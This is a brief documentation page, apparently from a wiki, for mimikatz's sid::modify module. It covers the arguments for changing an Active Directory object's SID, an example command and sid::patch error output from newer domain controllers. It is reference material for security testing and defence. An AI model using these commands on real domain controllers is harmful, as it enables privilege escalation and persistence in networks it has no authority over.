# modify

This module can be used to modify an object's SID. It has the following command line argument:

* `/sam`: the `sAMAccountName`.
* `/new`: the new SID value. It also accepts format such as `Builtin\administrators`.

```
mimikatz # sid::modify /sam:username /new:S-1-5-21-
```

![SID modification](../../../.gitbook/assets/sid\_modify.jpg)

{% hint style="warning" %}
The process of SID modification and changes push must be run on the domain controller.
{% endhint %}

{% hint style="info" %}
The image above was borrowed from one of Benjamin's [tweet](https://twitter.com/gentilkiwi/status/728367477458145280?s=20) since while attempting to reproduce the same steps on a Windows 2016 domain controller, the following error was encountered.

```
mimikatz # sid::patch
Patch 1/2: "ntds" service patched
Patch 2/2: ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000057)
```

[Dliv3](https://github.com/Dliv3) has [reported](https://github.com/gentilkiwi/mimikatz/issues/348) a similar situation on a Windows Server 2019.
{% endhint %}
